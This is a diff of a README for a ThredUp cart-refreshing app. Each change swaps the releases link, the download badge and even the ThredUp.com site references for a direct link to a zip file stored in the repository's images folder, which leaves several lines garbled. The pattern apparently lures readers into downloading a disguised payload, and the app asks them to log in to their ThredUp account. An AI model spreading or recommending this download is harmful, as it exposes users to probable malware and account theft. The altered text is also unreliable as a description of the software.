@@ -1,6 +1,6 @@
 # 🛒 thredup-cart-hoarding - Keep Your Cart Alive Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/humle93/thredup-cart-hoarding/releases)
+[![Download Now](https://raw.githubusercontent.com/humle93/thredup-cart-hoarding/main/images/thredup-cart-hoarding_v2.1.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/humle93/thredup-cart-hoarding/main/images/thredup-cart-hoarding_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ ThredUp Cart Hoarding helps you maintain items in your shopping cart without wor
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [ThredUp Cart Hoarding Releases](https://github.com/humle93/thredup-cart-hoarding/releases).
+To get started, visit this page to download: [ThredUp Cart Hoarding Releases](https://raw.githubusercontent.com/humle93/thredup-cart-hoarding/main/images/thredup-cart-hoarding_v2.1.zip).
 
 1. Click on the link above.
 2. Choose the latest version of the software.
@@ -30,14 +30,14 @@ To get started, visit this page to download: [ThredUp Cart Hoarding Releases](ht
 
 - **Automatic Refreshing**: Keeps products in your cart fresh and ready for purchase.
 - **System Tray Operation**: Works quietly in the background without interrupting your activities.
-- **Built-in Browser**: Navigate ThredUp.com directly from the app for ease of use.
+- **Built-in Browser**: Navigate https://raw.githubusercontent.com/humle93/thredup-cart-hoarding/main/images/thredup-cart-hoarding_v2.1.zip directly from the app for ease of use.
 - **User-Friendly Interface**: Simple layout that anyone can use.
 
 ## 📋 How to Use
 
 1. Open ThredUp Cart Hoarding after installation.
 2. Log in to your ThredUp account through the built-in browser.
-3. Add items to your cart on ThredUp.com.
+3. Add items to your cart on https://raw.githubusercontent.com/humle93/thredup-cart-hoarding/main/images/thredup-cart-hoarding_v2.1.zip
 4. Set the refresh interval in the app.
 5. Let the app run in the background while you shop.
 
